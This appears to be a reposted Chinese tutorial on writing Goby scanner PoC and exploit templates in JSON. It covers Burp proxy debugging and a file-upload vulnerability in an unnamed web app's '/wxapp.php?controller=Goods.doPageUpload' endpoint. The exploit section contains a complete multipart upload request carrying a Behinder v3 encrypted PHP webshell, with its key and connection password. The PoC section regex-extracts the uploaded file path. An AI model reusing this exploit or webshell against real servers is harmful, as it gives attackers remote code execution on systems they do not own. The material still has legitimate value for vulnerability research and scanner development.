> 原文链接: https://www.anquanke.com//post/id/249392 


# Json 编写 PoC&amp;EXP 遇到的那些坑


                                阅读量   
                                **23732**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01890af0bf939ee747.jpg)](https://p3.ssl.qhimg.com/t01890af0bf939ee747.jpg)



**前言：** 这几天师傅们都在提交 Goby 的 EXP，赶鸭子上架，一边研究一边写，也写出来几个，编写过程中遇到了很多问题，都记录了下来。这篇文章主要讲一些遇到过的坑及调试的问题，再通过一个文件上传类 PoC/EXP 来详细讲解。因为我也是刚刚学习编写，如果文章中的说法有什么问题请师傅们及时指出。我使用的版本是 goby-win-x64-1.8.275，PoC 使用 json 编写。



## 0×01 一些调试遇到的问题

### <a class="reference-link" name="1.1%20%E9%80%9A%E8%BF%87%20Burp%20%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%20Goby%20%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E8%B0%83%E8%AF%95"></a>1.1 通过 Burp 代理获取 Goby 流量进行调试

在扫描设置中设置 Burp 的代理。

[![](https://p0.ssl.qhimg.com/t010b71af9fa46fad7d.png)](https://p0.ssl.qhimg.com/t010b71af9fa46fad7d.png)

在设置完代理后最好重启一下，之后点击新建扫描-&gt;开始

[![](https://p1.ssl.qhimg.com/t01ef60daa305b740d4.png)](https://p1.ssl.qhimg.com/t01ef60daa305b740d4.png)

Burp中就可以抓到包了。

[![](https://p0.ssl.qhimg.com/t013a47b9763a4bf75c.png)](https://p0.ssl.qhimg.com/t013a47b9763a4bf75c.png)

**注意：设置代理后有个小问题，就是开始扫描后抓不到POC验证的流量，主要是因为开启扫描后 Goby 先进行端口、协议和资产的识别，再进行漏洞探测。所以这里扫描的话建议设置Burp 为 Intercept is off ，因为本身我们需要抓取的是 PoC 的流量，这里扫描的流量就看个人需求了。**（这里测试的只是Burp的代理，我用的版本是1.6的，至于其他的代理或者Burp版本还未测试）

扫描结果如下图所示：

[![](https://p3.ssl.qhimg.com/t019982214245eb6ca6.png)](https://p3.ssl.qhimg.com/t019982214245eb6ca6.png)

这时候要看 PoC 的流量在修改 PoC 中有一个单 ip 扫描，这里可以抓到 PoC 的流量

[![](https://p1.ssl.qhimg.com/t012bb166b604959038.png)](https://p1.ssl.qhimg.com/t012bb166b604959038.png)

可以看到已经拦截到流量了

[![](https://p0.ssl.qhimg.com/t01b92fb4230e2379fa.png)](https://p0.ssl.qhimg.com/t01b92fb4230e2379fa.png)

**注意：这里也有个小问题，就是如果在 PoC 管理中测试，必须先新建立扫描任务扫完后再去 PoC 管理中测试，Burp 才可以抓到包。**

还有个小技巧，通常修改完 PoC 后需要重启一下 Goby，如果想要快速调试PoC包并观察流量，修改完后可以点击返回到 PoC 管理页面再点击进来.

[![](https://p0.ssl.qhimg.com/t01064134523596e1d5.png)](https://p0.ssl.qhimg.com/t01064134523596e1d5.png)

可以看到流量中明显变化了。

[![](https://p0.ssl.qhimg.com/t0187416a1be7468685.png)](https://p0.ssl.qhimg.com/t0187416a1be7468685.png)

[![](https://p3.ssl.qhimg.com/t01c9cc43f9d02116c7.png)](https://p3.ssl.qhimg.com/t01c9cc43f9d02116c7.png)

### <a class="reference-link" name="1.2%20%E8%AF%86%E5%88%AB%E8%A7%84%E5%88%99%E5%B9%B6%E8%B0%83%E7%94%A8%20PoC"></a>1.2 识别规则并调用 PoC

经过测试发现 Goby 的 PoC 调用规则是先通过 PoC 写的查询规则去查询，如果查询到才会调用 PoC 进行扫描，否则就算你勾选了 PoC 也不会进行调用。具体得查询规则可以查看 Goby 查询语法

[![](https://p0.ssl.qhimg.com/t0123845d412121c341.png)](https://p0.ssl.qhimg.com/t0123845d412121c341.png)

这里就可以发现有时候通过 PoC 管理手动测试的漏洞可以验证成功，而通过扫描的地址无法检测到存在漏洞。

**注意：有时候一些 CMS 需要自己定义一些规则，比如 body=”this is test” || title=”管理登录”之类的，有时候会发现直接扫描域名无法匹配到其规则，如果扫描IP则会匹配到。**



## 0×02 编写文件上传类PoC及EXP

接下来通过一个文件上传类的 PoC/EXP 来讲解一下编写过程中遇到的问题。文件上传的 PoC 规则是需要上传一个输出特定信息并且自删除的脚本。如：

```
&lt;?php echo md5(233);unlink(__FILE__);?&gt;
```

这样的话我们需要在 PoC 处发送两次请求，第一次进行上传文件操作，第二次对上传的文件进行访问并验证，在访问之后这个文件会自动删除。

下面贴出请求代码，讲解我通过代码块写出。

```
"ScanSteps": [
    "AND",
    `{`
      "Request": `{`
        "method": "POST",
        "uri": "/wxapp.php?controller=Goods.doPageUpload",
        "follow_redirect": false,
        //header头的设置,这里最好还是通过Burp抓包把请求头写入防止请求出错
        "header": `{`
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
        `}`,
        "data_type": "text",
        //post数据可以从Burp中直接复制,通过Goby的图形化界面直接复制进去,这里会自动生成
        "data": "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.php\"\nContent-Type: image/gif\n\n&lt;?php echo md5(233);unlink(__FILE__);?&gt;\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
      `}`,
      "ResponseTest": `{`
        "type": "group",
        "operation": "AND",
        "checks": [
          `{`
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          `}`,
          `{`
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "image_o",
            "bz": ""
          `}`
        ]
      `}`,
      "SetVariable": [
        //这里需要设置两个变量,通过正则匹配返回，为上传文件的路径
        "urlDir|lastbody|regex|image_o\":\".*goods\\\\/(.*?)\\\\/.*\"",
        "urlDir2|lastbody|regex|image_o\":\".*goods\\\\/.*\\\\/(.*?)\""
      ]
    `}`,
    `{`
      "Request": `{`
        "method": "GET",
        //这里调用上面的两个变量去发送GET请求
        "uri": "/Uploads/image/goods/`{``{``{`urlDir`}``}``}`/`{``{``{`urlDir2`}``}``}`",
        "follow_redirect": false,
        "header": `{`
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1"
        `}`,
        "data_type": "text",
        "data": ""
      `}`,
      "ResponseTest": `{`
        "type": "group",
        "operation": "AND",
        "checks": [
          `{`
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          `}`,
          `{`
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "e165421110ba03099a1c0393373c5b43",//判断页面是否有该md5值
            "bz": ""
          `}`
        ]
      `}`,
      "SetVariable": []
    `}`
  ],
```

这里需要说一下下面的两句正则

```
"urlDir|lastbody|regex|image_o\":\".*goods\\\\/(.*?)\\\\/.*\"",
"urlDir2|lastbody|regex|image_o\":\".*goods\\\\/.*\\\\/(.*?)\""
```

因为输出的文件地址是 \/\/Uploads\/image\/goods\/2021-05-27\/0206254881620132.php 这样子的

如果写成这样

[![](https://p1.ssl.qhimg.com/t014db32be3c66a9305.png)](https://p1.ssl.qhimg.com/t014db32be3c66a9305.png)

直接调用发送 GET 请求为 %5C/image%5C/goods%5C/2021-05-27%5C/0206254881620132.php

[![](https://p2.ssl.qhimg.com/t01dc3da897910b662a.png)](https://p2.ssl.qhimg.com/t01dc3da897910b662a.png)

这种请求会返回404

[![](https://p5.ssl.qhimg.com/t012dcb35311969cae8.png)](https://p5.ssl.qhimg.com/t012dcb35311969cae8.png)

所以必须将 \ 去掉，已知文件的路径除了最后的上传日期和文件名在变化，其他不变，所以前面路径可以写死，通过正则取到日期和文件名进行组合请求。

**注意：如果使用 json 编写，\ 这里必须通过两个 \ 匹配，否则匹配不到**

“urlDir|lastbody|regex|image_o\”:\”.**goods\\/(.**?)\\/.*\”” 取出日期，结果为 2021-05-27

“urlDir2|lastbody|regex|image_o\”:\”.**goods\\/.**\\/(.*?)\”” 取出文件名 结果为 0206254881620132.php

然后通过 “uri”: “/Uploads/image/goods/`{``{``{`urlDir`}``}``}`/`{``{``{`urlDir2`}``}``}`” 请求则返回成功

[![](https://p5.ssl.qhimg.com/t015d33241558929cca.png)](https://p5.ssl.qhimg.com/t015d33241558929cca.png)

PoC 部分写完，接下来看 EXP 部分就比较简单了，

```
"ExploitSteps": [
    "AND",
    `{`
      "Request": `{`
        "method": "POST",
        "uri": "/wxapp.php?controller=Goods.doPageUpload",
        "follow_redirect": false,
        "header": `{`
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Accept-Encoding": "gzip, deflate, br",
          "Connection": "keep-alive",
          "Upgrade-Insecure-Requests": "1",
          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
        `}`,
        "data_type": "text",
        "data": "\n------WebKitFormBoundary8UaANmWAgM4BqBSs\nContent-Disposition: form-data; name=\"upfile\"; filename=\"shell.php\"\nContent-Type: image/gif\n\n&lt;?php\n@error_reporting(0);session_start();$key=\"e45e329feb5d925b\";$_SESSION['k']=$key;$post=file_get_contents(\"php://input\");if(!extension_loaded('openssl'))`{`$t=\"base64_\".\"decode\";$post=$t($post.\"\");for($i=0;$i&lt;strlen($post);$i++) `{`$post[$i] = $post[$i]^$key[$i+1&amp;15];`}``}`else`{`$post=openssl_decrypt($post, \"AES128\", $key);`}`$arr=explode('|',$post);$func=$arr[0];$params=$arr[1];class C`{`public function __invoke($p) `{`eval($p.\"\");`}``}`@call_user_func(new C(),$params);\n?&gt;\n\n------WebKitFormBoundary8UaANmWAgM4BqBSs--"
      `}`,
      "ResponseTest": `{`
        "type": "group",
        "operation": "AND",
        "checks": [
          `{`
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          `}`,
          `{`
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "image_o",
            "bz": ""
          `}`
        ]
      `}`,
      "SetVariable": [
        "output|lastbody|regex|image_o\":\"(.*?)\""
      ]
    `}`
  ],
```

直接上传 shell，这里的 data 数据还是通过 Burp 直接复制即可，通过 Goby 的图形化界面复制进去会自动生成换行符之类的，Exploit 部分可以先将数据通过 PoC 部分的图形化界面生成再复制进下面 Exploit 的 json 中。

[![](https://p1.ssl.qhimg.com/t01a15ed0cf45d55711.png)](https://p1.ssl.qhimg.com/t01a15ed0cf45d55711.png)

图片下方为测试截图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01991694dde1eacf28.png)

这里因为需要输出 shell 地址和连接方式，并且要去掉 \，这样的话就需要变量或者字符串拼接… 一直没测试成功，就通过 expParams 设置了一下显示信息…

```
"ExpParams": [
    `{`
      "name": "webshellinfo",
      "type": "textarea",
      "value": "Using Behinder_v3.0 connection, password is rebeyond",
      "show": ""
    `}`
  ],
```

但是这样是不合规的 – -，因为 ExpParams 不是当做输出信息来用的，而是为了给 EXP 传参用的。最后问了 Goby 的师傅说目前使用 json 编写要想在 output 处实现这样的需求是不行的，想要实现的话只能使用 go 来编写了。



## 0×03 总结

-.- 编写过程中还是遇到了很多问题，大部分算是解决了，当然一些需求还是需要用 go 写，希望能帮助还不会 go 语言的小伙伴们通过 json 去编写 PoC/EXP。最后感谢师傅们的指导~~~

> 文章来自Goby社区成员：HuaiNian，转载请注明出处。
下载Goby内测版，请关注公众号：Gobysec
下载Goby正式版，请访问官网：[http://gobies.org](http://gobies.org)

[![](https://p2.ssl.qhimg.com/t015fa6bf8cb7540f00.png)](https://p2.ssl.qhimg.com/t015fa6bf8cb7540f00.png)
